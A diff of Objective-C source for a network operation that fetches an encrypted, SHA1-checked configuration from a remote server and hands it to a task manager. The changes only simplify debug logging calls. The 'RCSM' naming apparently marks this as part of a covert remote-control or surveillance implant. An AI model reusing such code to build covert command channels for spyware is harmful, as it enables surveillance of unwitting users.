@@ -15,8 +15,8 @@
 #import "NSMutableData+SHA1.h"
 
 #import "RCSMTaskManager.h"
-
-//#define DEBUG_CONF_NOP
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
 
 
 @implementation ConfNetworkOperation
@@ -28,7 +28,7 @@
       mTransport = aTransport;
       
 #ifdef DEBUG_CONF_NOP
-      infoLog(ME, @"mTransport: %@", mTransport);
+      infoLog(@"mTransport: %@", mTransport);
 #endif
       return self;
     }
@@ -39,7 +39,7 @@
 - (BOOL)perform
 {
 #ifdef DEBUG_CONF_NOP
-  infoLog(ME, @"");
+  infoLog(@"");
 #endif
   
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
@@ -51,7 +51,7 @@
   [commandData appendData: commandSha];
   
 #ifdef DEBUG_CONF_NOP
-  infoLog(ME, @"commandData: %@", commandData);
+  infoLog(@"commandData: %@", commandData);
 #endif
   
   [commandData encryptWithKey: gSessionKey];
@@ -70,7 +70,7 @@
   [replyDecrypted decryptWithKey: gSessionKey];
   
 #ifdef DEBUG_CONF_NOP
-  infoLog(ME, @"replyDecrypted: %@", replyDecrypted);
+  infoLog(@"replyDecrypted: %@", replyDecrypted);
 #endif
 
   [replyDecrypted getBytes: &command
@@ -97,7 +97,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_CONF_NOP
-      errorLog(ME, @"exception on sha makerange (%@)", [e reason]);
+      errorLog(@"exception on sha makerange (%@)", [e reason]);
 #endif
       
       return NO;
@@ -106,14 +106,14 @@
   shaLocal = [shaLocal sha1Hash];
   
 #ifdef DEBUG_CONF_NOP
-  infoLog(ME, @"shaRemote: %@", shaRemote);
-  infoLog(ME, @"shaLocal : %@", shaLocal);
+  infoLog(@"shaRemote: %@", shaRemote);
+  infoLog(@"shaLocal : %@", shaLocal);
 #endif
   
   if ([shaRemote isEqualToData: shaLocal] == NO)
     {
 #ifdef DEBUG_CONF_NOP
-      errorLog(ME, @"sha mismatch");
+      errorLog(@"sha mismatch");
 #endif
       
       [replyDecrypted release];
@@ -126,7 +126,7 @@
   if (command != PROTO_OK)
     {
 #ifdef DEBUG_CONF_NOP
-      errorLog(ME, @"No configuration available (command %d)", command);
+      errorLog(@"No configuration available (command %d)", command);
 #endif
       
       [replyDecrypted release];
@@ -145,7 +145,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_CONF_NOP
-      errorLog(ME, @"exception on configSize makerange (%@)", [e reason]);
+      errorLog(@"exception on configSize makerange (%@)", [e reason]);
 #endif
       
       [replyDecrypted release];
@@ -156,13 +156,13 @@
     }
   
 #ifdef DEBUG_CONF_NOP
-  infoLog(ME, @"configSize: %d", configSize);
+  infoLog(@"configSize: %d", configSize);
 #endif
   
   if (configSize == 0)
     {
 #ifdef DEBUG_CONF_NOP
-      errorLog(ME, @"configuration size is zero!");
+      errorLog(@"configuration size is zero!");
 #endif
       
       [replyDecrypted release];
@@ -182,7 +182,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_CONF_NOP
-      errorLog(ME, @"exception on configData makerange (%@)", [e reason]);
+      errorLog(@"exception on configData makerange (%@)", [e reason]);
 #endif
       
       [replyDecrypted release];
@@ -200,7 +200,7 @@
   if ([taskManager updateConfiguration: configData] == FALSE)
     {
 #ifdef DEBUG_CONF_NOP
-      errorLog(ME, @"Error while storing new configuration");
+      errorLog(@"Error while storing new configuration");
 #endif
     
       [configData release];
